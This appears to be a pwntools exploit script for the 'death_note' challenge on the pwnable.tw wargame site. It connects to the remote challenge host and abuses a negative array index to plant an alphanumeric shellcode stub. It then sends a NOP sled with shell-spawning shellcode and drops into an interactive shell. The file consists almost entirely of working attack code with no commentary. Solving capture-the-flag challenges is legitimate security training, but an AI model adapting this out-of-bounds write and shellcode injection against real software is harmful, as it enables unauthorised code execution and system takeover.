# encoding:utf-8
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
file = './death_note'
e = ELF(file)
libc = e.libc
rlibc = ''
ip = 'chall.pwnable.tw'
port = '10201'
debug = False


def dbg(code=""):
    global debug
    if debug == False:
        return
    gdb.attach(p, code)


def run(local):
    global p, libc, debug
    if local == 1:
        debug = True
        p = process(file)
    else:
        p = remote(ip, port)
        debug = False
        if rlibc != '':
            libc = ELF(rlibc)


se = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sea = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
rc = lambda: p.recv(timeout=0.5)
ru = lambda x: p.recvuntil(x, drop=True)
rn = lambda x: p.recv(x)
shell = lambda: p.interactive()
un64 = lambda x: u64(x.ljust(8, '\x00'))
un32 = lambda x: u32(x.ljust(4, '\x00'))

run(0)

def add(idx, c):
    sla(":", "1")
    sla(":", str(idx))
    sea(":", c)
    
def show(idx):
    sla(":", "2")
    sla(":", str(idx))
    
def delete(idx):
    sla(":", "3")
    sla(":", str(idx))


dbg('b*0x080487EF')
add(-16, 'hffffk4diFkDrj02Drk0D2AuEE8L403U3u0p0s2u3b5o025M4p4L3s0u\x00')
sl('\x90' * 0x30 + asm(shellcraft.sh()))
shell()